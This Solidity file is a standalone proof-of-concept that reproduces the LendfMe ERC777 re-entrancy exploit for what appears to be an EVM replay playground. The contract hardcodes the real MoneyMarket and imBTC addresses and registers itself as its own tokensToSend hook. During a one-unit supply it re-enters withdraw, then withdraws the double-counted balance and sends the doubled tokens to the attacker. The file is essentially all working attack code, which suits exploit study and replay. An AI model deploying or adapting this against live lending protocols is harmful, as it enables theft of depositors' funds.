// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "./../interface.sol";

// Clean, Foundry-free reimplementation of the LendfMe ERC777 re-entrancy for the
// EVM Playground. The original PoC (LendfMe_exp.sol) drives the attack from a
// `is Test` harness whose `vm.startPrank`/`log_*` cheatcode calls target the
// Foundry cheat-address; that address has no code in the forked anvil dump, so
// the Solidity EXTCODESIZE guard reverts those calls during a plain EVM replay.
// This contract reproduces the exact attack without any cheatcodes: it is
// pre-seeded with the attacker's imBTC (via the Playground's `setup.transferAll`),
// registers itself as its own ERC777 `tokensToSend` implementer, then runs the
// supply(21594) -> supply(1)[re-enters withdraw] -> withdraw(max) doubling.

interface IMoneyMarketClean {
    function supply(address asset, uint256 amount) external returns (uint256);
    function withdraw(address asset, uint256 requestedAmount) external returns (uint256);
}

contract LendfMeExploitV2 {
    address internal constant VICTIM = 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea; // MoneyMarket (Lendf.Me)
    IERC20 internal constant IMBTC = IERC20(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    IERC1820Registry internal constant ERC1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 internal constant TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;

    address public immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    // ERC777 sender hook — invoked by imBTC (via the ERC1820 registry) whenever
    // THIS contract sends tokens. The re-entrancy trigger: on the supply(1)
    // transfer-in (amount == 1), call withdraw(max) before supply() commits.
    function tokensToSend(
        address, // operator
        address, // from
        address, // to
        uint256 amount,
        bytes calldata, // userData
        bytes calldata // operatorData
    ) external {
        if (amount == 1) {
            IMoneyMarketClean(VICTIM).withdraw(address(IMBTC), type(uint256).max);
        }
    }

    // Pre-seeded with the attacker's imBTC by the recorder's `setup` phase.
    function attack() external {
        // 1. Approve MoneyMarket to pull our imBTC during supply()'s doTransferIn.
        IMBTC.approve(VICTIM, type(uint256).max);

        // 2. Register ourselves as our own ERC777 `tokensToSend` implementer, so
        //    the next imBTC send where we are the sender calls tokensToSend().
        ERC1820.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));

        // 3. Honest deposit of all-but-one unit. The hook fires but (amount!=1)
        //    does nothing, so principal is committed normally.
        uint256 thisBalance = IMBTC.balanceOf(address(this));
        IMoneyMarketClean(VICTIM).supply(address(IMBTC), thisBalance - 1);

        // 4. supply(1): doTransferIn fires tokensToSend(amount==1) -> re-enters
        //    withdraw(max) which pays out the full principal, then this outer
        //    supply() overwrites principal with a STALE snapshot (the bug).
        IMoneyMarketClean(VICTIM).supply(address(IMBTC), 1);

        // 5. Withdraw the phantom (double-counted) balance a second time.
        IMoneyMarketClean(VICTIM).withdraw(address(IMBTC), type(uint256).max);

        // 6. Return the doubled imBTC to the attacker EOA.
        IMBTC.transfer(owner, IMBTC.balanceOf(address(this)));
    }
}
